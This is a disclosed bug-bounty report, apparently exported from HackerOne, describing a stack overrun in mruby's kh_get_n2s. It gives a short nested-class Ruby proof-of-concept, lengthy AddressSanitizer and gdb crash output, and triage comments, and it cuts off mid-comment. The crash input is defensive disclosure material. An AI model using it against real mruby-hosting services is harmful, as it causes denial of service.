{"id":192578,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI1Nzg=","url":"https://hackerone.com/reports/192578","title":"kh_get_n2s() stack overrun","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-12-20T00:50:06.395Z","submitted_at":"2016-12-20T00:50:06.395Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mg36","url":"/mg36","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-09T01:25:49.620Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-07T01:25:35.539Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Defining recursive classes could lead to a stack overrun in **kh_get_n2s**,\n\nPOC\n=====================\nWith this code we can achieve a stack overflow\n```\nclass\u003c\u003cProc\nclass P class\u003c\u003cProc\nclass P class P t end end\nend end end\n```\n\nDebug analysis\n=====================\n```\nsimo@vlab64:~/sources/mruby/bin/mruby/% cat CR1.rb | ../mruby_asan\nASAN:DEADLYSIGNAL\n=================================================================\n==99188==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd22656fc8 (pc 0x000000431cd0 bp 0x7ffd22657850 sp 0x7ffd22656fd0 T0)\n    #0 0x431ccf in __interceptor_memcmp (/home/simo/sources/mruby/bin/fuzz_mruby/mruby_asan+0x431ccf)\n    #1 0x534636 in kh_get_n2s /home/simo/sources/mruby_libF/src/symbol.c:37:1\n    #2 0x5363d2 in sym_intern /home/simo/sources/mruby_libF/src/symbol.c:62:9\n    #3 0x524fc5 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1562:23\n    #4 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #5 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #6 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #7 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #8 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #9 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #10 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #11 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #12 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #13 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #14 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #15 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #16 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #17 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #18 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #19 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #20 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #21 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #22 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #23 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #24 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #25 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #26 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #27 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #28 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #29 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #30 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #31 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #32 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #33 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #34 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #35 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #36 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #37 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #38 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #39 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #40 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #41 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #42 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #43 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #44 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #45 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #46 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #47 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #48 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #49 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #50 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #51 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #52 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #53 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #54 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #55 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #56 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #57 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #58 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #59 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #60 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #61 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #62 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #63 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #64 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #65 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #66 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #67 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #68 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #69 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #70 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #71 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #72 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #73 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #74 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #75 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #76 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #77 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #78 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #79 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #80 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #81 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #82 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #83 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #84 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #85 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #86 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #87 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #88 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #89 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #90 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #91 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #92 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #93 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #94 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #95 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #96 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #97 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #98 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #99 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #100 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #101 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #102 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #103 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #104 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #105 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #106 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #107 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #108 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #109 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #110 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #111 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #112 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #113 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #114 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #115 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #116 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #117 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #118 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #119 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #120 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #121 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #122 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #123 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #124 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #125 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #126 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #127 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #128 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #129 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #130 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #131 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #132 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #133 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #134 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #135 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #136 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #137 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #138 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #139 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #140 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #141 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #142 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #143 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #144 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #145 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #146 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #147 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #148 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #149 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #150 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #151 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #152 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #153 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #154 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #155 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #156 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #157 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #158 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #159 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #160 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #161 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #162 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #163 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #164 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #165 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #166 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #167 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #168 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #169 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #170 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #171 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #172 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #173 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #174 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #175 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #176 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #177 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #178 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #179 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #180 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #181 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #182 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #183 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #184 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #185 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #186 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #187 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #188 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #189 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #190 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #191 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #192 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #193 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #194 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #195 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #196 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #197 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #198 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #199 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #200 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #201 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #202 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #203 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #204 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #205 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #206 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #207 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #208 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #209 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #210 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #211 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #212 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #213 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #214 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #215 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #216 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #217 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #218 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #219 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #220 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #221 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #222 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #223 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #224 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #225 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #226 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #227 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #228 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #229 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #230 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #231 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #232 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #233 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #234 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #235 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #236 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #237 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #238 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #239 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #240 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #241 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #242 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #243 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #244 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #245 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #246 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #247 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #248 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n    #249 0x525110 in mrb_class_path /home/simo/sources/mruby_libF/src/class.c:1574:24\n\nSUMMARY: AddressSanitizer: stack-overflow (/home/simo/sources/mruby/bin/mruby/mruby_asan+0x431ccf) in __interceptor_memcmp\n==99188==ABORTING\n```\n\n```\n(gdb) r \u003c CR1.rb\nStarting program: /home/simo/sources/mruby/bin/mruby/mruby \u003c CR1.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000413b9d in sym_hash_func (mrb=\u003cerror reading variable: Cannot access memory at address 0x7fffff7fefd8\u003e, s=\u003cerror reading variable: Cannot access memory at address 0x7fffff7fefd4\u003e)\n    at /home/simo/sources/patch/mruby/src/symbol.c:24\n24\t{\n(gdb) x/5i $pc\n=\u003e 0x413b9d \u003csym_hash_func+4\u003e:\tmov    %rdi,-0x28(%rbp)\n   0x413ba1 \u003csym_hash_func+8\u003e:\tmov    %esi,-0x2c(%rbp)\n   0x413ba4 \u003csym_hash_func+11\u003e:\tmovl   $0x0,-0x1c(%rbp)\n   0x413bab \u003csym_hash_func+18\u003e:\tmov    -0x28(%rbp),%rax\n   0x413baf \u003csym_hash_func+22\u003e:\tmov    0x158(%rax),%rax\n(gdb) x/x $rbp-0x28\n0x7fffff7fefd8:\tCannot access memory at address 0x7fffff7fefd8\n(gdb) bt 10\n#0  0x0000000000413b9d in sym_hash_func (mrb=\u003cerror reading variable: Cannot access memory at address 0x7fffff7fefd8\u003e, s=\u003cerror reading variable: Cannot access memory at address 0x7fffff7fefd4\u003e)\n    at /home/simo/sources/patch/mruby/src/symbol.c:24\n#1  0x0000000000413e4f in kh_get_n2s (mrb=0x6af010, h=0x6bb590, key=0) at /home/simo/sources/patch/mruby/src/symbol.c:37\n#2  0x000000000041465d in sym_intern (mrb=0x6af010, name=0x46c25f \"__classid__\", len=11, lit=1 '\\001') at /home/simo/sources/patch/mruby/src/symbol.c:62\n#3  0x00000000004148b0 in mrb_intern_static (mrb=0x6af010, name=0x46c25f \"__classid__\", len=11) at /home/simo/sources/patch/mruby/src/symbol.c:101\n#4  0x0000000000404fcb in mrb_class_sym (mrb=0x6af010, c=0x6bb330, outer=0x6b21b0) at /home/simo/sources/patch/mruby/src/variable.c:1174\n#5  0x0000000000410bb5 in mrb_class_path (mrb=0x6af010, c=0x6bb330) at /home/simo/sources/patch/mruby/src/class.c:1567\n#6  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6b21b0) at /home/simo/sources/patch/mruby/src/class.c:1574\n#7  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6bb330) at /home/simo/sources/patch/mruby/src/class.c:1574\n#8  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6b21b0) at /home/simo/sources/patch/mruby/src/class.c:1574\n#9  0x0000000000410bf8 in mrb_class_path (mrb=0x6af010, c=0x6bb330) at /home/simo/sources/patch/mruby/src/class.c:1574\n(More stack frames follow...)\n(gdb)\n```\n\n","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-09T01:25:35.580Z","allow_singular_disclosure_after":-144937958.11319363,"singular_disclosure_allowed":true,"vote_count":8,"voters":["mpz","eveeez","mg36","spetr0x","mahmoud164new","jeffakiller123","llllllllll23","trammavie16"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1378285,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! Due to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. We'll get to your report as soon as we can. Thank you for your patience!","automated_response":false,"created_at":"2016-12-21T00:10:08.118Z","updated_at":"2016-12-21T00:10:08.118Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1408407,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report. We've reproduced the crash and opened an issue upstream: 